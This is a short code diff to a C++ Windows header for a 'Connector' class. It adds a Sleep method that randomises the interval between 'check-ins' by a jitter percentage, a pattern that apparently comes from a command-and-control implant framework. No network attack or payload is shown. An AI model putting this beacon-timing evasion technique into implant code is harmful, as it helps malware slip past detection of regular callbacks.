@@ -8,7 +8,11 @@
 
 #pragma once
 
+#ifdef _WIN32
+#include <winsock2.h>
+#endif
 #include <windows.h>
+#include <stdlib.h>
 
 class Connector
 {
@@ -36,8 +40,15 @@ public:
     // Sleep between check-ins. Override for custom sleep behavior.
     virtual void Sleep(ULONG sleepMs, ULONG jitter)
     {
-        // TODO: Implement sleep with jitter
-        ::Sleep(sleepMs);
+        ULONG ms = sleepMs;
+        if (jitter > 0 && jitter <= 90) {
+            int pct = (rand() % (jitter * 2 + 1)) - (int)jitter;
+            int adj = (int)sleepMs * pct / 100;
+            int total = (int)sleepMs + adj;
+            if (total < 0) total = 0;
+            ms = (ULONG)total;
+        }
+        ::Sleep(ms);
     }
 
     // Cleanup resources.
